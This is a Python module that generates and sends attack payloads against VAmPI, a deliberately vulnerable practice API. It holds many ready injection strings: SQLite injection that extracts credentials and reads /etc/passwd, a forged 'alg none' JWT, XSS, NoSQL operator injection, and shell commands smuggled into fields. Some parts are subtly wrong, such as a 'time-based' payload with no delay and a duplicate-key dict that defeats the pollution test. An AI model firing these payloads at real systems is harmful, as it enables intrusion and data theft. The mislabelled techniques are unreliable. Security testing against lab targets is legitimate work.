#!/usr/bin/env python3
"""
VAmPI-Specific Vulnerability Patterns

This module implements advanced vulnerability patterns specifically designed
for testing VAmPI (Vulnerable API) applications, including SQLite-specific
injections, business logic vulnerabilities, and edge case payloads.
"""

import json
import time
import asyncio
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum


class VAmPIPatternType(Enum):
    """Types of VAmPI-specific patterns"""
    SQLITE_INJECTION = "sqlite_injection"
    BUSINESS_LOGIC = "business_logic"
    WORKFLOW_MANIPULATION = "workflow_manipulation"
    RACE_CONDITION = "race_condition"
    EDGE_CASE_PAYLOAD = "edge_case_payload"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_ESCAPE = "authorization_escape"


@dataclass
class VAmPIPattern:
    """VAmPI-specific vulnerability pattern"""
    pattern_type: VAmPIPatternType
    name: str
    description: str
    payload: str
    expected_behavior: str
    severity: str
    category: str
    target_endpoints: List[str]
    prerequisites: List[str]


class VAmPIPatternGenerator:
    """Generator for VAmPI-specific vulnerability patterns"""
    
    def __init__(self):
        self.patterns = []
        self._initialize_sqlite_patterns()
        self._initialize_business_logic_patterns()
        self._initialize_edge_case_patterns()
        self._initialize_workflow_patterns()
        self._initialize_race_condition_patterns()
    
    def _initialize_sqlite_patterns(self):
        """Initialize SQLite-specific injection patterns for VAmPI"""
        sqlite_patterns = [
            # SQLite-specific UNION injection patterns
            VAmPIPattern(
                pattern_type=VAmPIPatternType.SQLITE_INJECTION,
                name="SQLite UNION Schema Extraction",
                description="Extract SQLite schema information using UNION queries",
                payload="1' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
                expected_behavior="Returns database schema information",
                severity="High",
                category="Information Disclosure",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.SQLITE_INJECTION,
                name="SQLite Table Enumeration",
                description="Enumerate all tables in SQLite database",
                payload="1' UNION SELECT name FROM sqlite_master WHERE type='table'--",
                expected_behavior="Returns list of table names",
                severity="Medium",
                category="Information Disclosure",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.SQLITE_INJECTION,
                name="SQLite Column Enumeration",
                description="Extract column information from specific tables",
                payload="1' UNION SELECT sql FROM sqlite_master WHERE name='users'--",
                expected_behavior="Returns table structure for users table",
                severity="Medium",
                category="Information Disclosure",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "users table exists"]
            ),
            
            # SQLite-specific time-based blind injection
            VAmPIPattern(
                pattern_type=VAmPIPatternType.SQLITE_INJECTION,
                name="SQLite Time-Based Blind Injection",
                description="Time-based blind SQL injection using SQLite functions",
                payload="1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='users')>0 AND (SELECT 1 FROM sqlite_master LIMIT 1 OFFSET 0) AND 1=1--",
                expected_behavior="Delayed response if condition is true",
                severity="High",
                category="Blind SQL Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            ),
            
            # SQLite-specific error-based injection
            VAmPIPattern(
                pattern_type=VAmPIPatternType.SQLITE_INJECTION,
                name="SQLite Error-Based Injection",
                description="Extract information through SQLite error messages",
                payload="1' AND (SELECT COUNT(*) FROM sqlite_master WHERE name='nonexistent_table')--",
                expected_behavior="Returns error message revealing database structure",
                severity="Medium",
                category="Error-Based SQL Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "Error messages enabled"]
            ),
            
            # SQLite-specific boolean-based blind injection
            VAmPIPattern(
                pattern_type=VAmPIPatternType.SQLITE_INJECTION,
                name="SQLite Boolean-Based Blind Injection",
                description="Boolean-based blind injection using SQLite-specific functions",
                payload="1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--",
                expected_behavior="Different response based on boolean condition",
                severity="High",
                category="Blind SQL Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            ),
            
            # SQLite-specific data extraction
            VAmPIPattern(
                pattern_type=VAmPIPatternType.SQLITE_INJECTION,
                name="SQLite Data Extraction",
                description="Extract sensitive data from SQLite database",
                payload="1' UNION SELECT username,password,email FROM users LIMIT 1--",
                expected_behavior="Returns user credentials",
                severity="Critical",
                category="Data Extraction",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "users table with credentials"]
            ),
            
            # SQLite-specific file system access
            VAmPIPattern(
                pattern_type=VAmPIPatternType.SQLITE_INJECTION,
                name="SQLite File System Access",
                description="Attempt to access file system through SQLite",
                payload="1' UNION SELECT load_extension('test')--",
                expected_behavior="May reveal file system access capabilities",
                severity="High",
                category="File System Access",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "Load extension enabled"]
            )
        ]
        
        self.patterns.extend(sqlite_patterns)
    
    def _initialize_business_logic_patterns(self):
        """Initialize business logic vulnerability patterns"""
        business_logic_patterns = [
            # Authentication bypass patterns
            VAmPIPattern(
                pattern_type=VAmPIPatternType.BUSINESS_LOGIC,
                name="JWT Algorithm Confusion",
                description="Bypass JWT validation using algorithm confusion",
                payload='{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin","exp":9999999999}.',
                expected_behavior="Bypasses JWT validation",
                severity="Critical",
                category="Authentication Bypass",
                target_endpoints=["/users/v1", "/books/v1"],
                prerequisites=["JWT authentication", "Algorithm confusion vulnerability"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.BUSINESS_LOGIC,
                name="JWT Secret Brute Force",
                description="Attempt to brute force JWT secret",
                payload="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.invalid_signature",
                expected_behavior="May reveal weak JWT secrets",
                severity="High",
                category="Authentication Bypass",
                target_endpoints=["/users/v1", "/books/v1"],
                prerequisites=["JWT authentication", "Weak secret"]
            ),
            
            # Authorization bypass patterns
            VAmPIPattern(
                pattern_type=VAmPIPatternType.BUSINESS_LOGIC,
                name="Role Escalation via Parameter Pollution",
                description="Escalate privileges through parameter pollution",
                payload={"role": "user", "role": "admin", "is_admin": "true"},
                expected_behavior="Gains admin privileges",
                severity="Critical",
                category="Privilege Escalation",
                target_endpoints=["/users/v1/register", "/users/v1"],
                prerequisites=["Parameter pollution vulnerability", "Role-based authorization"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.BUSINESS_LOGIC,
                name="IDOR via User ID Manipulation",
                description="Access other users' data through ID manipulation",
                payload={"user_id": "1", "target_user_id": "2"},
                expected_behavior="Accesses unauthorized user data",
                severity="High",
                category="Insecure Direct Object Reference",
                target_endpoints=["/users/v1/{user_id}"],
                prerequisites=["IDOR vulnerability", "User ID in request"]
            ),
            
            # Business rule bypass patterns
            VAmPIPattern(
                pattern_type=VAmPIPatternType.BUSINESS_LOGIC,
                name="Rate Limit Bypass via Header Manipulation",
                description="Bypass rate limiting through header manipulation",
                payload={"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "192.168.1.1", "X-Client-IP": "10.0.0.1"},
                expected_behavior="Bypasses rate limiting",
                severity="Medium",
                category="Rate Limit Bypass",
                target_endpoints=["/users/v1/login", "/users/v1/register"],
                prerequisites=["Rate limiting", "IP-based rate limiting"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.BUSINESS_LOGIC,
                name="Password Policy Bypass",
                description="Bypass password complexity requirements",
                payload={"password": "123456", "password_confirmation": "123456", "bypass_validation": "true"},
                expected_behavior="Accepts weak password",
                severity="Medium",
                category="Password Policy Bypass",
                target_endpoints=["/users/v1/register", "/users/v1/{user_id}/password"],
                prerequisites=["Password policy", "Validation bypass vulnerability"]
            ),
            
            # Workflow manipulation patterns
            VAmPIPattern(
                pattern_type=VAmPIPatternType.BUSINESS_LOGIC,
                name="Multi-Step Process Bypass",
                description="Bypass multi-step authentication process",
                payload={"step": "3", "completed_steps": ["1", "2", "3"], "skip_verification": "true"},
                expected_behavior="Skips required verification steps",
                severity="High",
                category="Process Bypass",
                target_endpoints=["/users/v1/register", "/users/v1/verify"],
                prerequisites=["Multi-step process", "State management vulnerability"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.BUSINESS_LOGIC,
                name="Session Fixation Attack",
                description="Fixate session ID to hijack user session",
                payload={"session_id": "fixed_session_123", "force_session": "true"},
                expected_behavior="Hijacks user session",
                severity="High",
                category="Session Management",
                target_endpoints=["/users/v1/login", "/me"],
                prerequisites=["Session management", "Session fixation vulnerability"]
            )
        ]
        
        self.patterns.extend(business_logic_patterns)
    
    def _initialize_edge_case_patterns(self):
        """Initialize edge case payload patterns"""
        edge_case_patterns = [
            # Unicode and encoding variations
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="Unicode SQL Injection",
                description="SQL injection using Unicode characters",
                payload="' OR 1=1--\u0000\u0001\u0002",
                expected_behavior="Bypasses Unicode filtering",
                severity="High",
                category="Unicode Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "Unicode handling"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="URL Encoding Bypass",
                description="Bypass filters using URL encoding",
                payload="%27%20OR%201%3D1--",
                expected_behavior="Bypasses URL decoding filters",
                severity="Medium",
                category="Encoding Bypass",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "URL encoding handling"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="Double URL Encoding",
                description="Double URL encoding to bypass filters",
                payload="%2527%2520OR%25201%253D1--",
                expected_behavior="Bypasses double encoding filters",
                severity="Medium",
                category="Encoding Bypass",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "Double encoding handling"]
            ),
            
            # Advanced XSS patterns
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="DOM-Based XSS",
                description="DOM-based XSS using JavaScript context",
                payload="javascript:alert('DOM XSS')",
                expected_behavior="Executes JavaScript in DOM context",
                severity="High",
                category="DOM-Based XSS",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["DOM-based XSS vulnerability", "JavaScript execution"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="Stored XSS with Event Handlers",
                description="Stored XSS using event handlers",
                payload="<img src=x onerror=alert('Stored XSS')>",
                expected_behavior="Executes JavaScript when rendered",
                severity="High",
                category="Stored XSS",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["Stored XSS vulnerability", "Event handler execution"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="Reflected XSS with Filter Bypass",
                description="Reflected XSS bypassing common filters",
                payload="<ScRiPt>alert('XSS')</ScRiPt>",
                expected_behavior="Bypasses case-sensitive filters",
                severity="Medium",
                category="Reflected XSS",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["Reflected XSS vulnerability", "Case-sensitive filtering"]
            ),
            
            # Advanced NoSQL patterns
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="NoSQL Injection with Regex",
                description="NoSQL injection using regex operators",
                payload='{"$regex": ".*admin.*", "$options": "i"}',
                expected_behavior="Bypasses NoSQL authentication",
                severity="High",
                category="NoSQL Injection",
                target_endpoints=["/users/v1/login"],
                prerequisites=["NoSQL injection vulnerability", "MongoDB or similar"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="NoSQL Injection with JavaScript",
                description="NoSQL injection using JavaScript evaluation",
                payload='{"$where": "this.username == \'admin\' && this.password == \'password\'"}',
                expected_behavior="Executes JavaScript in NoSQL context",
                severity="Critical",
                category="NoSQL Injection",
                target_endpoints=["/users/v1/login"],
                prerequisites=["NoSQL injection vulnerability", "JavaScript evaluation enabled"]
            ),
            
            # Command injection patterns
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="Command Injection with Semicolon",
                description="Command injection using semicolon separator",
                payload="test; cat /etc/passwd",
                expected_behavior="Executes system commands",
                severity="Critical",
                category="Command Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["Command injection vulnerability", "System command execution"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.EDGE_CASE_PAYLOAD,
                name="Command Injection with Pipe",
                description="Command injection using pipe operator",
                payload="test | whoami",
                expected_behavior="Executes system commands via pipe",
                severity="Critical",
                category="Command Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["Command injection vulnerability", "Pipe operator support"]
            )
        ]
        
        self.patterns.extend(edge_case_patterns)
    
    def _initialize_workflow_patterns(self):
        """Initialize workflow manipulation patterns"""
        workflow_patterns = [
            VAmPIPattern(
                pattern_type=VAmPIPatternType.WORKFLOW_MANIPULATION,
                name="State Machine Bypass",
                description="Bypass state machine validation",
                payload={"current_state": "completed", "next_state": "admin", "skip_validation": "true"},
                expected_behavior="Bypasses state machine controls",
                severity="High",
                category="State Machine Bypass",
                target_endpoints=["/users/v1/register", "/users/v1/verify"],
                prerequisites=["State machine", "State validation vulnerability"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.WORKFLOW_MANIPULATION,
                name="Transaction Rollback Bypass",
                description="Bypass transaction rollback mechanisms",
                payload={"transaction_id": "123", "force_commit": "true", "bypass_rollback": "true"},
                expected_behavior="Commits transaction despite errors",
                severity="High",
                category="Transaction Bypass",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["Transaction management", "Rollback bypass vulnerability"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.WORKFLOW_MANIPULATION,
                name="Workflow Step Skipping",
                description="Skip required workflow steps",
                payload={"completed_steps": ["1", "2", "3", "4"], "current_step": "5", "skip_to_final": "true"},
                expected_behavior="Skips to final step without validation",
                severity="Medium",
                category="Workflow Bypass",
                target_endpoints=["/users/v1/register", "/users/v1/verify"],
                prerequisites=["Multi-step workflow", "Step validation vulnerability"]
            )
        ]
        
        self.patterns.extend(workflow_patterns)
    
    def _initialize_race_condition_patterns(self):
        """Initialize race condition patterns"""
        race_condition_patterns = [
            VAmPIPattern(
                pattern_type=VAmPIPatternType.RACE_CONDITION,
                name="Concurrent User Creation",
                description="Create multiple users with same email simultaneously",
                payload={"email": "test@example.com", "username": "testuser", "password": "password123"},
                expected_behavior="May create duplicate users or bypass validation",
                severity="Medium",
                category="Race Condition",
                target_endpoints=["/users/v1/register"],
                prerequisites=["User registration", "Concurrent request handling"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.RACE_CONDITION,
                name="Concurrent Password Reset",
                description="Request multiple password resets simultaneously",
                payload={"email": "admin@example.com", "action": "reset_password"},
                expected_behavior="May bypass rate limiting or create multiple reset tokens",
                severity="Medium",
                category="Race Condition",
                target_endpoints=["/users/v1/password/reset"],
                prerequisites=["Password reset functionality", "Rate limiting"]
            ),
            
            VAmPIPattern(
                pattern_type=VAmPIPatternType.RACE_CONDITION,
                name="Concurrent Book Creation",
                description="Create multiple books with same title simultaneously",
                payload={"title": "Test Book", "author": "Test Author", "isbn": "1234567890"},
                expected_behavior="May create duplicate books or bypass validation",
                severity="Low",
                category="Race Condition",
                target_endpoints=["/books/v1"],
                prerequisites=["Book creation", "Concurrent request handling"]
            )
        ]
        
        self.patterns.extend(race_condition_patterns)
    
    def get_patterns_by_type(self, pattern_type: VAmPIPatternType) -> List[VAmPIPattern]:
        """Get patterns by type"""
        return [pattern for pattern in self.patterns if pattern.pattern_type == pattern_type]
    
    def get_patterns_by_endpoint(self, endpoint: str) -> List[VAmPIPattern]:
        """Get patterns applicable to specific endpoint"""
        applicable_patterns = []
        for pattern in self.patterns:
            if any(target in endpoint for target in pattern.target_endpoints):
                applicable_patterns.append(pattern)
        return applicable_patterns
    
    def get_all_patterns(self) -> List[VAmPIPattern]:
        """Get all patterns"""
        return self.patterns
    
    def get_patterns_by_severity(self, severity: str) -> List[VAmPIPattern]:
        """Get patterns by severity level"""
        return [pattern for pattern in self.patterns if pattern.severity == severity]


class VAmPIBusinessLogicTester:
    """Tester for business logic vulnerabilities"""
    
    def __init__(self, base_url: str, session):
        self.base_url = base_url
        self.session = session
        self.pattern_generator = VAmPIPatternGenerator()
    
    async def test_workflow_manipulation(self, endpoint: str, method: str) -> Dict[str, Any]:
        """Test workflow manipulation vulnerabilities"""
        results = []
        workflow_patterns = self.pattern_generator.get_patterns_by_type(VAmPIPatternType.WORKFLOW_MANIPULATION)
        
        for pattern in workflow_patterns:
            if any(target in endpoint for target in pattern.target_endpoints):
                try:
                    url = f"{self.base_url}{endpoint}"
                    
                    if method.upper() == "POST":
                        response = self.session.post(url, json=pattern.payload, timeout=30)
                    elif method.upper() == "PUT":
                        response = self.session.put(url, json=pattern.payload, timeout=30)
                    else:
                        response = self.session.get(url, params=pattern.payload, timeout=30)
                    
                    result = {
                        "pattern_name": pattern.name,
                        "pattern_type": pattern.pattern_type.value,
                        "payload": pattern.payload,
                        "status_code": response.status_code,
                        "response_length": len(response.text),
                        "vulnerability_found": self._analyze_workflow_response(response, pattern),
                        "severity": pattern.severity,
                        "category": pattern.category
                    }
                    
                    results.append(result)
                    
                except Exception as e:
                    results.append({
                        "pattern_name": pattern.name,
                        "error": str(e),
                        "vulnerability_found": False
                    })
        
        return {
            "endpoint": endpoint,
            "method": method,
            "test_type": "workflow_manipulation",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_race_conditions(self, endpoint: str, method: str, concurrent_requests: int = 5) -> Dict[str, Any]:
        """Test race condition vulnerabilities"""
        results = []
        race_patterns = self.pattern_generator.get_patterns_by_type(VAmPIPatternType.RACE_CONDITION)
        
        for pattern in race_patterns:
            if any(target in endpoint for target in pattern.target_endpoints):
                try:
                    url = f"{self.base_url}{endpoint}"
                    
                    # Create concurrent requests
                    tasks = []
                    for i in range(concurrent_requests):
                        if method.upper() == "POST":
                            task = self._make_concurrent_request(self.session.post, url, pattern.payload)
                        elif method.upper() == "PUT":
                            task = self._make_concurrent_request(self.session.put, url, pattern.payload)
                        else:
                            task = self._make_concurrent_request(self.session.get, url, pattern.payload)
                        tasks.append(task)
                    
                    # Execute concurrent requests
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Analyze responses for race conditions
                    race_condition_detected = self._analyze_race_condition_responses(responses, pattern)
                    
                    result = {
                        "pattern_name": pattern.name,
                        "pattern_type": pattern.pattern_type.value,
                        "payload": pattern.payload,
                        "concurrent_requests": concurrent_requests,
                        "responses_received": len([r for r in responses if not isinstance(r, Exception)]),
                        "race_condition_detected": race_condition_detected,
                        "severity": pattern.severity,
                        "category": pattern.category,
                        "response_codes": [r.status_code if hasattr(r, 'status_code') else 'error' for r in responses]
                    }
                    
                    results.append(result)
                    
                except Exception as e:
                    results.append({
                        "pattern_name": pattern.name,
                        "error": str(e),
                        "race_condition_detected": False
                    })
        
        return {
            "endpoint": endpoint,
            "method": method,
            "test_type": "race_conditions",
            "results": results,
            "total_tests": len(results),
            "race_conditions_found": sum(1 for r in results if r.get("race_condition_detected", False))
        }
    
    async def _make_concurrent_request(self, request_func, url, payload):
        """Make a concurrent request"""
        try:
            if request_func == self.session.get:
                return request_func(url, params=payload, timeout=30)
            else:
                return request_func(url, json=payload, timeout=30)
        except Exception as e:
            return e
    
    def _analyze_workflow_response(self, response, pattern) -> bool:
        """Analyze response for workflow manipulation indicators"""
        if response.status_code == 200:
            # Check for success indicators that shouldn't be present
            response_text = response.text.lower()
            success_indicators = ["success", "completed", "verified", "approved"]
            return any(indicator in response_text for indicator in success_indicators)
        
        return False
    
    def _analyze_race_condition_responses(self, responses, pattern) -> bool:
        """Analyze responses for race condition indicators"""
        valid_responses = [r for r in responses if hasattr(r, 'status_code')]
        
        if len(valid_responses) < 2:
            return False
        
        # Check for inconsistent responses
        status_codes = [r.status_code for r in valid_responses]
        response_lengths = [len(r.text) for r in valid_responses]
        
        # Race condition indicators:
        # 1. Multiple successful responses when only one should succeed
        # 2. Inconsistent response lengths
        # 3. Different status codes for identical requests
        
        multiple_success = status_codes.count(200) > 1
        inconsistent_lengths = len(set(response_lengths)) > 1
        inconsistent_codes = len(set(status_codes)) > 1
        
        return multiple_success or inconsistent_lengths or inconsistent_codes


class VAmPIAdvancedPayloadGenerator:
    """Generator for advanced payload variations"""
    
    def __init__(self):
        self.sqlite_payloads = self._generate_sqlite_payloads()
        self.unicode_payloads = self._generate_unicode_payloads()
        self.encoding_payloads = self._generate_encoding_payloads()
        self.xss_payloads = self._generate_advanced_xss_payloads()
        self.nosql_payloads = self._generate_advanced_nosql_payloads()
        self.command_payloads = self._generate_command_payloads()
    
    def _generate_sqlite_payloads(self) -> List[str]:
        """Generate SQLite-specific injection payloads"""
        return [
            # SQLite schema extraction
            "1' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
            "1' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            "1' UNION SELECT sql FROM sqlite_master WHERE name='users'--",
            
            # SQLite time-based blind injection
            "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0 AND (SELECT 1 FROM sqlite_master LIMIT 1 OFFSET 0) AND 1=1--",
            "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE name='users')>0 AND 1=1--",
            
            # SQLite error-based injection
            "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE name='nonexistent_table')--",
            "1' AND (SELECT sql FROM sqlite_master WHERE name='users' AND type='table')--",
            
            # SQLite boolean-based blind injection
            "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--",
            "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE name='users')>0--",
            
            # SQLite data extraction
            "1' UNION SELECT username,password,email FROM users LIMIT 1--",
            "1' UNION SELECT * FROM users WHERE username='admin'--",
            
            # SQLite file system access
            "1' UNION SELECT load_extension('test')--",
            "1' UNION SELECT readfile('/etc/passwd')--",
            
            # SQLite-specific functions
            "1' UNION SELECT hex(randomblob(10))--",
            "1' UNION SELECT quote(randomblob(10))--",
            "1' UNION SELECT zeroblob(10)--",
            
            # SQLite version detection
            "1' UNION SELECT sqlite_version()--",
            "1' UNION SELECT sqlite_source_id()--"
        ]
    
    def _generate_unicode_payloads(self) -> List[str]:
        """Generate Unicode-based payload variations"""
        return [
            # Unicode null bytes
            "' OR 1=1--\u0000\u0001\u0002",
            "admin'\u0000--",
            "1'\u0000UNION SELECT * FROM users--",
            
            # Unicode escape sequences
            "' OR 1=1--\\u0000\\u0001\\u0002",
            "admin'\\u0000--",
            "1'\\u0000UNION SELECT * FROM users--",
            
            # Unicode normalization
            "' OR 1=1--\u00A0\u00A0\u00A0",  # Non-breaking spaces
            "admin'\u00A0--",
            "1'\u00A0UNION SELECT * FROM users--",
            
            # Unicode case variations
            "' OR 1=1--\u0041\u0042\u0043",  # ABC in Unicode
            "admin'\u0041--",
            "1'\u0041UNION SELECT * FROM users--"
        ]
    
    def _generate_encoding_payloads(self) -> List[str]:
        """Generate encoding-based payload variations"""
        return [
            # URL encoding
            "%27%20OR%201%3D1--",
            "admin%27--",
            "1%27%20UNION%20SELECT%20*%20FROM%20users--",
            
            # Double URL encoding
            "%2527%2520OR%25201%253D1--",
            "admin%2527--",
            "1%2527%2520UNION%2520SELECT%2520*%2520FROM%2520users--",
            
            # HTML encoding
            "&#39; OR 1=1--",
            "admin&#39;--",
            "1&#39; UNION SELECT * FROM users--",
            
            # Hex encoding
            "0x27204f5220313d312d2d",  # ' OR 1=1--
            "0x61646d696e272d2d",  # admin'--
            
            # Base64 encoding
            "JyBPUiAxPTEtLQ==",  # ' OR 1=1--
            "YWRtaW4nLS0=",  # admin'--
            
            # Mixed encoding
            "%27%20OR%201%3D1--\u0000",
            "admin%27--\u0000",
            "1%27%20UNION%20SELECT%20*%20FROM%20users--\u0000"
        ]
    
    def _generate_advanced_xss_payloads(self) -> List[str]:
        """Generate advanced XSS payload variations"""
        return [
            # DOM-based XSS
            "javascript:alert('DOM XSS')",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "javascript:alert(/XSS/)",
            
            # Event handler XSS
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            
            # Filter bypass XSS
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert('XSS')</script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            
            # Encoded XSS
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert('XSS')</script>",
            
            # Context-specific XSS
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            
            # Advanced XSS techniques
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            
            # XSS with encoding
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;"
        ]
    
    def _generate_advanced_nosql_payloads(self) -> List[str]:
        """Generate advanced NoSQL injection payloads"""
        return [
            # MongoDB regex injection
            '{"$regex": ".*admin.*", "$options": "i"}',
            '{"$regex": "^admin", "$options": "i"}',
            '{"$regex": "admin$", "$options": "i"}',
            
            # MongoDB JavaScript injection
            '{"$where": "this.username == \'admin\'"}',
            '{"$where": "this.password == \'password\'"}',
            '{"$where": "this.username == \'admin\' && this.password == \'password\'"}',
            
            # MongoDB comparison operators
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$exists": true}',
            '{"$in": ["admin", "user"]}',
            '{"$nin": ["user"]}',
            
            # MongoDB logical operators
            '{"$or": [{"username": "admin"}, {"username": "user"}]}',
            '{"$and": [{"username": "admin"}, {"password": "password"}]}',
            '{"$not": {"username": "user"}}',
            
            # MongoDB array operators
            '{"$all": ["admin", "user"]}',
            '{"$elemMatch": {"role": "admin"}}',
            '{"$size": 1}',
            
            # MongoDB type operators
            '{"$type": "string"}',
            '{"$type": "number"}',
            '{"$type": "object"}',
            
            # MongoDB geospatial operators
            '{"$near": {"$geometry": {"type": "Point", "coordinates": [0, 0]}}}',
            '{"$geoWithin": {"$geometry": {"type": "Polygon", "coordinates": [[[0, 0], [1, 1], [1, 0], [0, 0]]]}}}'
        ]
    
    def _generate_command_payloads(self) -> List[str]:
        """Generate command injection payloads"""
        return [
            # Semicolon separator
            "test; cat /etc/passwd",
            "test; whoami",
            "test; id",
            "test; ls -la",
            
            # Pipe operator
            "test | whoami",
            "test | cat /etc/passwd",
            "test | id",
            "test | ls -la",
            
            # Ampersand operator
            "test & whoami",
            "test & cat /etc/passwd",
            "test & id",
            "test & ls -la",
            
            # Backtick execution
            "test `whoami`",
            "test `cat /etc/passwd`",
            "test `id`",
            "test `ls -la`",
            
            # Dollar sign execution
            "test $(whoami)",
            "test $(cat /etc/passwd)",
            "test $(id)",
            "test $(ls -la)",
            
            # Command substitution
            "test; echo $(whoami)",
            "test; echo `cat /etc/passwd`",
            "test; echo $(id)",
            "test; echo `ls -la`",
            
            # Multiple commands
            "test; whoami; id; cat /etc/passwd",
            "test | whoami | id",
            "test & whoami & id",
            
            # Environment variable injection
            "test; echo $PATH",
            "test; echo $HOME",
            "test; echo $USER",
            "test; env",
            
            # File redirection
            "test; cat /etc/passwd > /tmp/test",
            "test; whoami > /tmp/test",
            "test; id > /tmp/test"
        ]
    
    def get_all_payloads(self) -> Dict[str, List[str]]:
        """Get all payload categories"""
        return {
            "sqlite": self.sqlite_payloads,
            "unicode": self.unicode_payloads,
            "encoding": self.encoding_payloads,
            "xss": self.xss_payloads,
            "nosql": self.nosql_payloads,
            "command": self.command_payloads
        }
    
    def get_payloads_by_category(self, category: str) -> List[str]:
        """Get payloads by category"""
        return self.get_all_payloads().get(category, [])